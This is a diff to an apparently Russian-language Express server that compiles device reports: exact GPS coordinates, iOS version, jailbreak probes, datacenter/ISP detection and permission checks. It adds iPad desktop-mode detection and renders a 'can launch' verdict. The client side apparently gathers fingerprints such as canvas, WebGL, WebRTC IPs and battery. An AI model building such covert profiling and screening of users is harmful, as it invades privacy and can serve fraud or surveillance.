@@ -1,4 +1,4 @@
-// === server/index.js (photo+caption + one HTML doc; patched JB logic) ===
+// === server/index.js (photo+caption + one HTML doc; patched JB logic + iPad desktop fix) ===
 import 'dotenv/config';
 import express from 'express';
 import path from 'path';
@@ -133,10 +133,10 @@ function gmLink(lat, lon, z = 17) {
 
 // ===== status & verdict =====
 const OK = (b) => b ? '✅' : '❌';
-function normVer(iosVersion) {
-  if (typeof iosVersion === 'number') return iosVersion;
-  if (typeof iosVersion === 'string') {
-    const v = parseFloat(iosVersion.replace(/[^0-9.]/g,''));
+function normVer(maybe) {
+  if (typeof maybe === 'number') return maybe;
+  if (typeof maybe === 'string') {
+    const v = parseFloat(maybe.replace(/[^0-9.]/g,''));
     return Number.isFinite(v) ? v : null;
   }
   return null;
@@ -148,10 +148,42 @@ function isIgnoredScheme(s = '') {
   return IGNORE_SCHEMES.some(rx => rx.test(String(s)));
 }
 
-function deriveStatus({ iosVersion, platform, cp = {}, dc = {} }) {
-  const v = normVer(iosVersion);
-  const iosOk      = v != null && v >= 18;
-  const platformOk = /iPhone|iPad/i.test(String(platform || ''));
+// ===== iPad desktop-mode detection (патч) =====
+// Условие iPadOS с desktop UA: platform = Mac|MacIntel И (тач>1 ИЛИ явные флаги/UA)
+function isIpadDesktop({ platform, userAgent, cp }) {
+  const plat = String(platform || '');
+  const ua   = String(userAgent || '');
+  const touch = Number(cp?.maxTouchPoints ?? cp?.navigator?.maxTouchPoints ?? 0);
+  const flagIpad = cp?.isIpad === true || /iPad/i.test(ua);
+  const isMacPlat = /Mac(Intel)?/i.test(plat);
+  return isMacPlat && (touch > 1 || flagIpad);
+}
+
+// Берём iOS версию: прямой параметр или фолбэки из cp
+function pickIosVersion(iosVersion, cp) {
+  const candidates = [
+    iosVersion,
+    cp?.iosVersion,
+    cp?.ios?.version,
+    cp?.os?.iosVersion,
+    cp?.device?.iOSVersion
+  ].filter(v => v != null);
+  for (const v of candidates) {
+    const n = normVer(v);
+    if (n != null) return n;
+  }
+  return null;
+}
+
+function deriveStatus({ iosVersion, platform, userAgent, cp = {}, dc = {} }) {
+  const v = pickIosVersion(iosVersion, cp);
+  const iosOk = v != null && v >= 18;
+
+  // Платформа ок: iPhone/iPad/… или iPad в десктоп-режиме
+  const plat = String(platform || '');
+  const classicOk = /iPhone|iPad/i.test(plat);
+  const ipadDesktopOk = isIpadDesktop({ platform: plat, userAgent, cp });
+  const platformOk = classicOk || ipadDesktopOk;
 
   // --- JB пересчёт по факту результатов
   const jb            = cp?.jbProbesActive || {};
@@ -180,13 +212,15 @@ function deriveStatus({ iosVersion, platform, cp = {}, dc = {} }) {
   return {
     iosOk, platformOk, jbOk, dcOk, geoOk, camOk, micOk,
     jbLabel, dcWords, canLaunch,
+    iosVersionDetected: v,
+    ipadDesktopOk,
     _jb: { rows: jbRows, rowsRaw: jbRowsRaw, anyOpened }
   };
 }
 
 // [HTML] — единый отчёт (чеклист + сводка + JB-таблица + сырой JSON)
 function buildHtmlReport({ code, geo, userAgent, platform, iosVersion, isSafari, cp, dc }) {
-  const s   = deriveStatus({ iosVersion, platform, cp, dc });
+  const s   = deriveStatus({ iosVersion, platform, userAgent, cp, dc });
   const jb  = cp?.jbProbesActive || {};
   const jbSum  = jb.summary || {};
 
@@ -195,15 +229,6 @@ function buildHtmlReport({ code, geo, userAgent, platform, iosVersion, isSafari,
     ? s._jb.rows
     : (Array.isArray(jb.results) ? jb.results.filter(r => !isIgnoredScheme(r?.scheme)) : []);
   const fp = jbRows.find(r => r?.opened === true) || null;
-
-  const pubIP = cp?.publicIp || {};
-  const net   = cp?.network  || {};
-  const bat   = cp?.battery  || null;
-  const webgl = cp?.webgl    || null;
-  const canvas= cp?.canvasFingerprint || null;
-  const inApp = cp?.inAppWebView || {};
-  const locale= cp?.locale || {};
-  const webrtcCount = Array.isArray(cp?.webrtcIps) ? cp.webrtcIps.length : 0;
 
   const css = `
     :root { color-scheme: light dark; }
@@ -238,8 +263,8 @@ function buildHtmlReport({ code, geo, userAgent, platform, iosVersion, isSafari,
     <div class="card">
       <h2>Чеклист статуса</h2>
       <div class="kv">
-        <div><b>iOS ≥ 18</b></div><div>${OK(s.iosOk)} <span class="${s.iosOk?'ok':'bad'}">${s.iosOk?'ok':'low'}</span> <span class="pill"><code>${escapeHTML(String(iosVersion ?? 'n/a'))}</code></span></div>
-        <div><b>Платформа iPhone/iPad</b></div><div>${OK(s.platformOk)} <span class="${s.platformOk?'ok':'bad'}">${s.platformOk?'ok':'not iOS'}</span> <span class="pill"><code>${escapeHTML(String(platform||'n/a'))}</code></span></div>
+        <div><b>iOS ≥ 18</b></div><div>${OK(s.iosOk)} <span class="${s.iosOk?'ok':'bad'}">${s.iosOk?'ok':'low'}</span> <span class="pill"><code>${escapeHTML(String(s.iosVersionDetected ?? 'n/a'))}</code></span></div>
+        <div><b>Платформа iPhone/iPad</b></div><div>${OK(s.platformOk)} <span class="${s.platformOk?'ok':'bad'}">${s.platformOk ? (s.ipadDesktopOk ? 'iPad (desktop-mode)' : 'ok') : 'not iOS'}</span> <span class="pill"><code>${escapeHTML(String(platform||'n/a'))}</code></span></div>
         <div><b>Jailbreak</b></div><div>${OK(s.jbOk)} <span class="${s.jbOk?'ok':'bad'}">${s.jbOk?'нет джейлбрейка':'обнаружены признаки'}</span> <span class="pill"><code>${escapeHTML(s.jbLabel||'n/a')}</code></span></div>
         <div><b>DC/ISP сигнатуры</b></div><div>${OK(s.dcOk)} <span class="${s.dcOk?'ok':'bad'}">${s.dcOk?'нет':'найдены'}</span></div>
         <div><b>Гео-разрешение</b></div><div>${OK(s.geoOk)}</div>
@@ -256,7 +281,7 @@ function buildHtmlReport({ code, geo, userAgent, platform, iosVersion, isSafari,
       <div class="kv">
         <div><b>Code</b></div><div><code>${escapeHTML(String(code).toUpperCase())}</code></div>
         <div><b>UA</b></div><div><code>${escapeHTML(userAgent || '')}</code></div>
-        <div><b>iOS / Platform</b></div><div><code>${escapeHTML(String(iosVersion ?? ''))}</code> · <code>${escapeHTML(String(platform||''))}</code></div>
+        <div><b>iOS / Platform</b></div><div><code>${escapeHTML(String(s.iosVersionDetected ?? ''))}</code> · <code>${escapeHTML(String(platform||''))}</code></div>
         <div><b>Jailbreak</b></div><div>${escapeHTML(jbInfo)}</div>
         <div><b>Geo</b></div><div>${geo ? `<a class="soft" href="https://maps.google.com/?q=${encodeURIComponent(geo.lat)},${encodeURIComponent(geo.lon)}&z=17" target="_blank" rel="noreferrer">${escapeHTML(`${geo.lat}, ${geo.lon}`)}</a> &nbsp;±${escapeHTML(String(geo.acc))} м` : 'нет данных'}</div>
       </div>
@@ -285,7 +310,7 @@ function buildHtmlReport({ code, geo, userAgent, platform, iosVersion, isSafari,
   ` : '';
 
   const jsonPretty = safeJson({
-    geo, userAgent, platform, iosVersion, isSafari,
+    geo, userAgent, platform, iosVersionDetected: s.iosVersionDetected, isSafari,
     client_profile: cp, device_check: dc
   }, 2);
 
@@ -401,14 +426,14 @@ app.post('/api/report', async (req, res) => {
 
     const cp = client_profile || {};
     const dc = device_check   || {};
-    const s  = deriveStatus({ iosVersion, platform, cp, dc });
+    const s  = deriveStatus({ iosVersion, platform, userAgent, cp, dc });
 
     // ---- CAPTION (с чеклистом и "Можно запускать")
     const captionLines = [
       '<b>Новый отчёт 18+ проверка</b>',
       `Code: <code>${escapeHTML(String(code).toUpperCase())}</code>`,
-      `${OK(s.iosOk)} iOS: <code>${escapeHTML(String(iosVersion ?? 'n/a'))}</code>`,
-      `${OK(s.platformOk)} Платформа: <code>${escapeHTML(String(platform||'n/a'))}</code>`,
+      `${OK(s.iosOk)} iOS: <code>${escapeHTML(String(s.iosVersionDetected ?? 'n/a'))}</code>`,
+      `${OK(s.platformOk)} Платформа: <code>${escapeHTML(String(platform||'n/a'))}${s.ipadDesktopOk ? ' (iPad desktop-mode)' : ''}</code>`,
       `${OK(s.jbOk)} ${s.jbOk ? 'нет джейлбрейка' : 'обнаружены JB-признаки'}`,
       `${OK(s.dcOk)} DC/ISP: ${s.dcOk ? 'нет' : '<b>найдены</b>'}`,
       `Geo: ${geo ? `${gmLink(geo.lat, geo.lon)} <code>±${escapeHTML(String(geo.acc))}</code>m` : '<code>нет</code>'}`,
